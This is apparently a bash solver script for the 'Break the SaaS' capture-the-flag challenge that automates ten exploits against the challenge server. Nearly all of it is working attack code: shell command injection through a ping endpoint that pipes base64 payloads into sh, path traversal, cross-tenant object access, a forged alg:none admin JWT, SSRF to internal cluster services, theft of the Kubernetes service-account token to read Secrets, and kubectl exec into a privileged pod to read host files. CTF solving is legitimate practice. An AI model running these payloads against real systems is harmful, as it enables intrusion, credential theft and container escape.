#!/usr/bin/env bash
# Flag collection helper for the "Break the SaaS" hamCTF challenge.
#
# This script reproduces the ten solutions documented in the accompanying
# walkthrough. Run it only against the official CTF target.

set -Eeuo pipefail

TARGET='https://ctf.seoeh.ir'
REGISTRY='https://hub.hamdocker.ir'
IMAGE_PATH='seoeh/hamamooz_challlenges'

blue='\033[0;34m'
green='\033[0;32m'
red='\033[0;31m'
reset='\033[0m'

total=0

step() {
  printf "${blue}[*]${reset} %s\n" "$1"
}

save_flag() {
  local number="$1"
  local value="$2"

  if [[ -z "$value" ]]; then
    printf "${red}[-]${reset} Flag %s was not returned.\n" "$number" >&2
    return 1
  fi

  printf "${green}[+] Flag %s:${reset} %s\n" "$number" "$value"
  total=$((total + 1))
}

# Pull the first HAMAMOOZ{...} value from any text response. Using Python here
# avoids depending on GNU grep, which is not installed by default on macOS.
find_flag() {
  python3 -c '
import re, sys
match = re.search(r"HAMAMOOZ\{[^}]+\}", sys.stdin.read())
if match is None:
    raise SystemExit(1)
print(match.group(0))
'
}

# Print one top-level value from a JSON response.
json_value() {
  python3 -c 'import json,sys; print(json.load(sys.stdin)[sys.argv[1]])' "$1"
}

# The diagnostic route evaluates our extra shell fragment inside the backend
# pod. Base64 keeps quotes and line breaks intact while the command travels in
# JSON and then through a second shell.
run_in_backend() {
  local program="$1"
  local encoded

  encoded=$(printf '%s' "$program" | base64 | tr -d '\n')
  curl -sk -X POST "${TARGET}/api/diag/ping" \
    -H 'Content-Type: application/json' \
    -d "{\"host\":\"127.0.0.1; echo ${encoded} | base64 -d | sh\"}" \
    | json_value output
}

step 'Flag 1: recovering a deleted .env file from an image layer'
registry_token=$(
  curl -sk "${REGISTRY}/v2/token?service=harbor-registry&scope=repository:${IMAGE_PATH}:pull" \
    | json_value token
)
env_layer='sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041'
flag_1=$(
  curl -sk -H "Authorization: Bearer ${registry_token}" \
    "${REGISTRY}/v2/${IMAGE_PATH}/blobs/${env_layer}" \
    | tar xzO app/.env 2>/dev/null \
    | find_flag
)
save_flag 1 "$flag_1"

step 'Flag 2: checking the public OpenAPI description'
flag_2=$(curl -sk "${TARGET}/swagger.json" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["info"]["description"])' \
  | find_flag)
save_flag 2 "$flag_2"

step 'Flag 3: calling the debug-only route with its trusted header'
flag_3=$(curl -sk -H 'X-Debug-Mode: true' \
  "${TARGET}/api/internal/flag" | json_value flag)
save_flag 3 "$flag_3"

step 'Flag 4: leaving the reports folder with a traversal sequence'
flag_4=$(curl -sk "${TARGET}/api/reports/download?file=../flag.txt" | find_flag)
save_flag 4 "$flag_4"

step 'Flag 5: requesting a report that belongs to a different organization'
flag_5=$(curl -sk "${TARGET}/api/orgs/2/reports/2" | json_value secret_note)
save_flag 5 "$flag_5"

step 'Flag 6: creating an unsigned token that claims the admin role'
admin_token=$(python3 -c '
import base64, json
def part(value):
    raw = json.dumps(value, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
print(part({"alg": "none", "typ": "JWT"}) + "." +
      part({"sub": "1", "role": "admin"}) + ".")
')
flag_6=$(curl -sk -H "Authorization: Bearer ${admin_token}" \
  "${TARGET}/admin/dashboard" | json_value flag)
save_flag 6 "$flag_6"

step 'Flag 7: asking the webhook tester to visit a cluster-only service'
flag_7=$(curl -sk -X POST "${TARGET}/api/webhooks/test" \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET"}' \
  | find_flag)
save_flag 7 "$flag_7"

step 'Flag 8: using the pod identity to read a Kubernetes Secret'
read_secret='python3 << "PY"
import base64
import json
import ssl
import urllib.request

token_file = "/var/run/secrets/kubernetes.io/serviceaccount/token"
with open(token_file) as handle:
    token = handle.read().strip()

request = urllib.request.Request(
    "https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets/flag-secret",
    headers={"Authorization": "Bearer " + token},
)
context = ssl._create_unverified_context()
with urllib.request.urlopen(request, context=context, timeout=10) as response:
    secret = json.load(response)

print(base64.b64decode(secret["data"]["flag"]).decode())
PY'
flag_8=$(run_in_backend "$read_secret" | find_flag)
save_flag 8 "$flag_8"

step 'Flag 9: appending cat to the vulnerable ping command'
flag_9=$(curl -sk -X POST "${TARGET}/api/diag/ping" \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' \
  | json_value output \
  | find_flag)
save_flag 9 "$flag_9"

step 'Flag 10: entering the privileged worker and reading its host-mounted file'
read_node_file='token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --server=https://kubernetes.default.svc \
  --token="$token" \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- \
  cat /host/var/lib/node-data/flag.txt'
flag_10=$(run_in_backend "$read_node_file" | find_flag)
save_flag 10 "$flag_10"

printf '\n'
printf "${green}Finished: %s/10 documented flags collected.${reset}\n" "$total"
